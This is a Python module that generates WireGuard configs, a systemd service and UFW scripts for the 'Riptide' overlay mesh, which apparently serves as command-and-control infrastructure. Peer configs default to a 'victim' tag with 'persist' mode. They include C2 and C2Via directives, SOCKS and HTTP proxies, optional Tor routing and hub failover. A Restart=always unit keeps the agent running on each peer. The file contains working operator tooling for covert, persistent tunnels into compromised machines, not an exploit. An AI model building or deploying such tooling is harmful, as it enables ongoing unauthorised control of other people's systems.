"""Render WireGuard confs, units, UFW from mesh state."""
from __future__ import annotations

from pathlib import Path
from typing import Any

from lib.roster import as_json, public_roster

KEEPALIVE = 25


def hub_conf(data: dict[str, Any]) -> str:
    hub = data["hub"]
    lines = [
        "# Riptide hub — kernel wg-quick or riptide-agent --hub",
        "[Interface]",
        f"PrivateKey = {hub['private']}",
        f"Address = {hub['address']}",
        f"ListenPort = {data['listen_port']}",
        "# Table = off   # uncomment if you only want overlay, no default route",
        "",
    ]
    for p in data.get("peers", []):
        ip = p["address"].split("/")[0] + "/32"
        lines += [
            f"# peer {p['name']} ({p['os']})",
            "[Peer]",
            f"PublicKey = {p['public']}",
            f"PresharedKey = {p['psk']}",
            f"AllowedIPs = {ip}",
            "",
        ]
    return "\n".join(lines)


def ops_overlays(data: dict[str, Any]) -> list[str]:
    out = []
    for p in data.get("peers") or []:
        if p.get("tag") == "ops":
            out.append(p["address"].split("/")[0])
    return out


def extra_hubs(data: dict[str, Any]) -> list[dict[str, Any]]:
    return [p for p in data.get("peers") or [] if p.get("role") == "hub"]


def conf_for(data: dict[str, Any], peer: dict[str, Any]) -> str:
    if peer.get("role") == "hub":
        return hub_host_conf(data, peer)
    return peer_conf(data, peer)


def hub_host_conf(data: dict[str, Any], hub: dict[str, Any]) -> str:
    """Userspace hub on a host (BOF). Cryptokey-routes overlay peers. No TAP."""
    primary = data["hub"]
    listen = int(hub.get("listen_port") or data.get("listen_port") or 51820)
    eps = data.get("endpoints") or [data.get("endpoint")]
    ep0 = (eps or [data.get("endpoint")])[0]
    tag = hub.get("tag") or "ops"
    allow = ",".join(ops_overlays(data) + [primary["address"].split("/")[0]])
    lines = [
        f"# Riptide HUB {hub['name']} — ListenPort {listen}  (BOF / riptide-agent)",
        "[Interface]",
        f"PrivateKey = {hub['private']}",
        f"Address = {hub['address']}",
        f"ListenPort = {listen}",
        "",
        "# primary hub",
        "[Peer]",
        f"PublicKey = {primary['public']}",
        f"PresharedKey = {hub['psk']}",
        "AllowedIPs = 10.66.0.1/32",
        f"Endpoint = {ep0}",
        f"PersistentKeepalive = {KEEPALIVE}",
        "",
    ]
    extra_eps: list[tuple[str, str]] = []
    for p in data.get("peers") or []:
        if p["name"] == hub["name"]:
            continue
        psk = (hub.get("spoke_psk") or {}).get(p["name"]) or (p.get("hub_psk") or {}).get(hub["name"])
        if not psk:
            continue
        ip = p["address"].split("/")[0] + "/32"
        block = [
            f"# {p['name']} ({p.get('role') or p['os']})",
            "[Peer]",
            f"PublicKey = {p['public']}",
            f"PresharedKey = {psk}",
            f"AllowedIPs = {ip}",
        ]
        if p.get("role") == "hub" and (p.get("endpoints") or []):
            block.append(f"Endpoint = {p['endpoints'][0]}")
            block.append(f"PersistentKeepalive = {KEEPALIVE}")
            extra_eps.append((p["address"].split("/")[0], ",".join(p["endpoints"])))
        block.append("")
        lines += block
    c2 = data.get("c2") or {}
    fail = ",".join(x["address"].split("/")[0] for x in extra_hubs(data) if x["name"] != hub["name"])
    lines += [
        "[Riptide]",
        "Tag = ops",
        "Mode = persist",
        "HTTP = 127.0.0.1:8080",
        "SOCKS = 127.0.0.1:1080",
        "Control = 127.0.0.1:7670",
        "Shields = 0",
        f"Allow = {allow}",
        f"Hubs = {','.join(e for e in eps if e)}",
    ]
    for hip, s in extra_eps:
        lines.append(f"Hubs.{hip} = {s}")
    if fail:
        lines.append(f"Failover = {fail}")
    if c2.get("host"):
        lines.append(f"C2 = {c2['host']}")
        lines.append(f"C2Via = {c2.get('via') or '10.66.0.1:443'}")
    if hub.get("tor"):
        lines.append("Tor = 1")
    lines.append("")
    return "\n".join(lines)


def peer_conf(data: dict[str, Any], peer: dict[str, Any]) -> str:
    hub = data["hub"]
    tag = peer.get("tag") or "victim"
    mode = peer.get("mode") or "persist"
    c2 = data.get("c2") or {}
    allow = ",".join(ops_overlays(data) + [h["address"].split("/")[0] for h in extra_hubs(data)])
    routes = peer.get("routes") or []
    if isinstance(routes, str):
        routes_s = routes
    else:
        routes_s = ",".join(routes)
    serve = peer.get("serve") or ""
    shields = "1" if tag != "ops" else "0"
    eps = [e for e in (data.get("endpoints") or [data.get("endpoint")]) if e]
    lines = [
        f"# Riptide peer {peer['name']} — overlay {peer['address']}",
        "[Interface]",
        f"PrivateKey = {peer['private']}",
        f"Address = {peer['address']}",
        "",
        "[Peer]",
        f"PublicKey = {hub['public']}",
        f"PresharedKey = {peer['psk']}",
        f"Endpoint = {eps[0] if eps else data['endpoint']}",
        "AllowedIPs = 10.66.0.0/24",
        f"PersistentKeepalive = {KEEPALIVE}",
        "",
    ]
    extra_eps: list[tuple[str, str]] = []
    for h in extra_hubs(data):
        psk = (peer.get("hub_psk") or {}).get(h["name"]) or (h.get("spoke_psk") or {}).get(peer["name"])
        if not psk:
            continue
        hip = h["address"].split("/")[0]
        heps = [e for e in (h.get("endpoints") or []) if e]
        block = [
            f"# extra hub {h['name']}",
            "[Peer]",
            f"PublicKey = {h['public']}",
            f"PresharedKey = {psk}",
            f"AllowedIPs = {hip}/32",
        ]
        if heps:
            block.append(f"Endpoint = {heps[0]}")
            block.append(f"PersistentKeepalive = {KEEPALIVE}")
            extra_eps.append((hip, ",".join(heps)))
        block.append("")
        lines += block
    lines += [
        "[Riptide]",
        f"Tag = {tag}",
        f"Mode = {mode}",
        "HTTP = 127.0.0.1:8080",
        "SOCKS = 127.0.0.1:1080",
        "Control = 127.0.0.1:7670",
        f"Shields = {shields}",
    ]
    if eps:
        lines.append(f"Hubs = {','.join(eps)}")
    for hip, s in extra_eps:
        lines.append(f"Hubs.{hip} = {s}")
    fail = ",".join(h["address"].split("/")[0] for h in extra_hubs(data))
    if fail:
        lines.append(f"Failover = {fail}")
    if peer.get("tor"):
        lines.append("Tor = 1")
    if allow:
        lines.append(f"Allow = {allow}")
    if c2.get("host"):
        lines.append(f"C2 = {c2['host']}")
        lines.append(f"C2Via = {c2.get('via') or '10.66.0.1:443'}")
    if routes_s:
        lines.append(f"Routes = {routes_s}")
    if serve:
        lines.append(f"Serve = {serve}")
    lines.append("")
    return "\n".join(lines)


def systemd_unit(binary: str = "/usr/local/sbin/riptide-agent", conf: str = "/etc/riptide/peer.conf") -> str:
    return f"""[Unit]
Description=Riptide overlay agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={binary} --config {conf}
Restart=always
RestartSec=5
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ReadOnlyPaths={conf}
PrivateTmp=yes

[Install]
WantedBy=multi-user.target
"""


def ufw_mesh(listen_port: int = 51820) -> str:
    return f"""#!/usr/bin/env bash
# Overlay-aware UFW. Does NOT --force enable. Does NOT --force reset.
# WAN: 80/443 TCP + {listen_port}/udp. SSH and operator WSS only in on wg0.
set -euo pipefail
if [[ "${{CONFIRM:-}}" != "YES" ]]; then
  echo "refusing: set CONFIRM=YES after reviewing rules" >&2
  exit 2
fi
ufw default deny incoming
ufw default allow outgoing
ufw allow 80/tcp comment 'http-acme'
ufw allow 443/tcp comment 'https-edge'
ufw allow {listen_port}/udp comment 'riptide-wg'
ufw allow in on wg0 to any port 22 proto tcp comment 'ssh-overlay'
ufw allow in on wg0 to any port 40056 proto tcp comment 'op-wss-overlay'
ufw allow in on wg0 to any port 7668 proto tcp comment 'riptide-connect'
ufw allow in on wg0 to any port 53 proto udp comment 'riptide-dns'
ufw route allow in on wg0 out on wg0 comment 'riptide-overlay'
echo "[+] rules queued. enable yourself: ufw enable"
ufw status verbose
"""


def install_hub_sh() -> str:
    return """#!/usr/bin/env bash
# Apply hub-wg0.conf on THIS box. Never pointed at a VPS from Kali.
set -euo pipefail
if [[ "${CONFIRM:-}" != "YES" ]]; then
  echo "refusing: CONFIRM=YES required. Do not run against production WAN from here." >&2
  exit 2
fi
CONF_SRC="${1:-./hub-wg0.conf}"
install -d -m 700 /etc/wireguard
install -m 600 "$CONF_SRC" /etc/wireguard/wg0.conf
sysctl -w net.ipv4.ip_forward=1 >/dev/null
wg-quick down wg0 2>/dev/null || true
wg-quick up wg0
wg show
"""


def write_tree(out: Path, data: dict[str, Any]) -> list[Path]:
    """Write all operator files for current state (confs + units)."""
    written: list[Path] = []
    hub_dir = out / "hub"
    peers_dir = out / "peers"
    hub_dir.mkdir(parents=True, exist_ok=True)
    peers_dir.mkdir(parents=True, exist_ok=True)

    def dump(path: Path, text: str, mode: int = 0o600) -> None:
        path.write_text(text, encoding="utf-8", newline="\n")
        try:
            path.chmod(mode)
        except OSError:
            pass
        written.append(path)

    dump(hub_dir / "wg0.conf", hub_conf(data))
    dump(out / "hub-wg0.conf", hub_conf(data))
    dump(hub_dir / "roster.json", as_json(public_roster(data)), 0o644)
    dump(hub_dir / "install-hub.sh", install_hub_sh(), 0o700)
    dump(hub_dir / "ufw-mesh.sh", ufw_mesh(int(data["listen_port"])), 0o700)
    dump(out / "riptide-agent.service", systemd_unit(), 0o644)
    hubs_dir = out / "hubs"
    hubs_dir.mkdir(parents=True, exist_ok=True)
    for p in data.get("peers", []):
        dump(peers_dir / f"{p['name']}.conf", conf_for(data, p))
        if p.get("role") == "hub":
            dump(hubs_dir / f"{p['name']}.conf", conf_for(data, p))
    return written
